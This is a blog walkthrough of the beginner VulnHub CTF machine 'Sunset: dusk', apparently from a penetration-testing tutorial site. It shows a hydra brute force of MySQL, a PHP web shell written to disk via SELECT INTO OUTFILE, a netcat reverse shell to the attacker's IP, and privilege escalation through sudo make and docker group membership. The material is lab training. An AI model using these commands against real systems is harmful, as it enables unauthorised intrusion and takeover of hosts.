<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Sunset: dusk: Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/sunset-dusk-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-12-21T04:45:15+00:00">December 21, 2019</time><time class="updated" datetime="2025-06-10T20:10:49+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Sunset: dusk is another CTF challenge given by vulnhub and the level difficulty is set according to beginners and credit goes to whitecr0wz. You have to hunt two flags, and this is a boot to root challenge. Download it from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/sunset-dusk,404/">here</a></strong></span>.</span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodologies</strong></span></h3>
<p><span style="color: #000000;"><strong>Network scanning</strong></span></p>
<ul>
<li><span style="color: #000000;">Nmap</span></li>
<li><span style="color: #000000;">netdiscover</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Weak credentials</span></li>
<li><span style="color: #000000;">PHP file injection</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting RCE</strong></span></p>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Sudo rights</span></li>
<li><span style="color: #000000;">Docker</span></li>
</ul>
<p><span style="color: #000000;"><strong><u>Walkthrough</u></strong></span></p>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">First of all, we try to identify our target. We did this using the netdiscover command.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lbyLuTzM818/Xf2g9DzqYlI/AAAAAAAAiAw/olW2t9hO2uc7D3O2f1Ugy2GhB4QdTuVnQCLcBGAsYHQ/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Now that we have identified our target using the above command, we can continue to our next step i.e. scanning the host IP to identify open ports and running services. We will use Nmap to scan the target with the following command:</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.167</pre>
<p><span style="color: #000000;">As a result we found multiple open ports and services are running across them thus, we need to enumerate further to step ahead.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-U7FmFCd06AU/Xf2g90iE1mI/AAAAAAAAiA0/qRDkLhaCyJA29HAdsGfNZb9vHEb8E-tWwCLcBGAsYHQ/s1600/2.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">We’ve start the enumeration with FTP and HTTP and tried to find some suspicious information but unfortunately, fail to get any remarkable clue thus we tried for mysql brute force attack with the help of hydra using rockyou.txt file.</span></p>
<pre class="lang:default decode:true">hydra -l root -P /usr/share/wordlists/rockyou.txt  192.168.1.167 mysql</pre>
<p><span style="color: #000000;">And we found the login creds for MySQL where username is <strong>root </strong>and password is <strong>password </strong>which also considered as a weak credential.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-q_vTrmElVGA/Xf2g-IZoLdI/AAAAAAAAiA4/OlE-eH6-rlIr9P2qqDjI1301UbezkA1aACLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">We also navigate to port 8080 and it looks like, that page is displaying the list of the current directory, here the author has left the hint for writable directory /var/tmp.  Thus, it becomes easy for us to deface the machine using these loopholes.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-g6hBqYezXLA/Xf2g-fXPvdI/AAAAAAAAiA8/fhpdI8LwFv0Ybb-4zqgGnPug29F_6amQgCLcBGAsYHQ/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Since we have MySQL cred and we also know the working directory is /var/tmp and with the help of this we can inject malicious PHP code as SQL query into a file named “raj.php”. This will generate an RCE and as a result, we will be able to spawn host machine by exploiting it. </span></p>
<pre class="lang:default decode:true">select "&lt;?php system($_GET['cmd']); ?&gt;" into outfile '/var/tmp/raj.php' ;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ex50KbW5TgQ/Xf2g-8WYmJI/AAAAAAAAiBA/FXBw7Yc3QIobeMfyq0vJSvpdOU4HDv_CwCLcBGAsYHQ/s1600/5.png"/></span></p>
<p><span style="color: #000000;">So, again we navigate to port 8080 and saw the entry for raj.php file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4-LspER1PRw/Xf2g_f_-q3I/AAAAAAAAiBI/jI5dRNre-5w9Q08yrA1UxGxPi8YGHxEzQCLcBGAsYHQ/s1600/6.png"/></span></p>
<p><span style="color: #000000;">It was time to execute raj.php and verify the RCE parameter by executing the following URL:</span></p>
<pre class="lang:default decode:true">http://192.168.1.167:8080/raj.php?cmd=id</pre>
<p><span style="color: #000000;">Thus, we find that we are able to run system command through this page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_ysHWxxa6Sk/Xf2g_V_wefI/AAAAAAAAiBE/ZwtJvyu63x4KgVqwGhZ8igzHpJ6SN0QUgCLcBGAsYHQ/s1600/7.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploiting </strong></span></h3>
<p><span style="color: #000000;">It was time to exploit RCE, thus we used the netcat reverse shell to spawning shell o host machine.</span></p>
<pre class="lang:default decode:true">http://192.168.1.167:8080/raj.php?cmd=nc -e /bin/bash 192.168.1.107 1234</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uAWJAvSEc6E/Xf2g_z31RKI/AAAAAAAAiBM/sT_Xm4b7qN0svwqOQ-r1PAYPOlCwVGU5gCLcBGAsYHQ/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Bravo!! We hit the goal and spawn the shell of host the machine and found the 1<sup>st</sup> flag user.txt in the /home/dusk.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5TujSzcYGQM/Xf2hAROYuoI/AAAAAAAAiBQ/oYUIcYvVUOwhnWQfYLXn3aBivRFQxZ0SgCLcBGAsYHQ/s1600/9.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">Further we move towards privilege escalation and identify the sudo rights for www-data and notice that user:www-data holds sudo rights for “make” &amp; “sl” program but here we try to escalate to shell for user:dusk by exploiting make program.</span></p>
<pre class="lang:default decode:true">COMMAND='/bin/sh'
sudo -u make -s --eval=$'x:\n\t-'"$COMMAND"</pre>
<p><span style="color: #000000;">After executing the above command, we were able to access the host shell as user dusk who is also the member of the docker group.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NzABvaUrgUc/Xf2g9KkQ-bI/AAAAAAAAiAs/eWJ1BUeDgy0iTZQ3XeE0r7GK-1QB96vyQCLcBGAsYHQ/s1600/10.png"/></span></p>
<p><span style="color: #000000;">As we know user:dusk is a member of the ‘docker’ group, thus by running the following command you will get a root shell and as result you will able to capture the final flag. </span><br/>
<span style="color: #000000;">The command you execute to perform the privilege escalation will fetches Docker image from the Docker Hub Registry and runs it. The -v parameter that you pass to Docker specifies that you want to create a volume in the Docker instance. The -i and -t parameters put Docker into ‘shell mode’ rather than starting a daemon process.</span></p>
<pre class="lang:default decode:true  ">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Q5adadjrhlA/Xf2g86JImUI/AAAAAAAAiAo/Ubig637eo2snlxRnP9ZjOTXZAynxO0BhACLcBGAsYHQ/s1600/11.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Komal Singh is a Cyber Security Researcher and Technical Content Writer, she is a completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/komal-rajput-26b783131/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
